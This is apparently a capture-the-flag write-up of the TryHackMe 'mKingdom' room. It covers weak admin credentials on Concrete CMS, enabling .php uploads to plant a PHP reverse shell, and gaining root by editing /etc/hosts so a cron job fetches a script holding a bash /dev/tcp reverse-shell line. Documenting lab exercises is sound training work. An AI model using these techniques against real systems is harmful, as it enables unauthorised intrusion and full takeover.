---
title: THM mKingdom
author: hanhctf
date: 2024-06-20 12:00:00 +0700
categories: [Write-up, THM]
tags: []
toc: true
mermaid: true
---

# [**mKingdom**](https://tryhackme.com/r/room/mkingdom)

# Summary

> - Weak Credential in admin portal.
> - Hidden Creds in backup file and enviroment.  

## NMAP

```text
PORT   STATE SERVICE REASON  VERSION
85/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0H N0! PWN3D 4G4IN
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

## Web Enumeration

In homepage, nothing intertging.  
FUZZ directory with `ffuf`, we found `/app`.  
![](/commons/THM/mKingdom/0_app.png)  

Looking on `/app`.  
App is using `Concrete CMS 8.5.2`.  
Quick search about `Concrete CMS 8.5.2`.  
![](/commons/THM/mKingdom/1_CMS.png)

After read `Document`, we found login page url.  
![](/commons/THM/mKingdom/2_login.png)  

`Weak credential`. Login in to `dashboard` with weak credential.  

After check some functions in admin dashboard.
We can upload file to system. `File upload` vuln is first thing in my mind.  
After check some technique to by pass system, no luck.  
Continuous check other setting, we can add file `extensions` allow.  
Add `.php` and upload a `php reverse shell`.  
![](/commons/THM/mKingdom/3_extensions.png)  

![](/commons/THM/mKingdom/4_rev.png)  

![](/commons/THM/mKingdom/5_shell.png)  

Spawn a tty shell with python.  

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

[linpeas.sh](https://github.com/peass-ng/PEASS-ng). I've mentioned it many times, it's one of my favorite tools for finding ways to escalate privileges.  
Found interting `password`  
![](/commons/THM/mKingdom/6_toad.png)  

Change user and run `linpeas.sh` again.  

![](/commons/THM/mKingdom/7_mario.png)  

***GOT USER.TXT FLAG***

## Privilege Escalation

Countinuing run `linpeas.sh`. we discovered a bunch of interesting things but none of them were usable.  
![](/commons/THM/mKingdom/8_hosts.png)  

After deep enumeration, check cronjob with [pspy](https://github.com/DominicBreuker/pspy)  

![](/commons/THM/mKingdom/9_curl.png)  

Lookback, we can edit `/etc/hosts`.  
Creat a `/app/castle/application/counter.sh` in localhost.

```shell
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

And run http server on port 85.
Change `/etc/hosts` with `localIP mkingdom.thm` and  
![](/commons/THM/mKingdom//10_root.png)

***GOT ROOT.TXT FLAG***
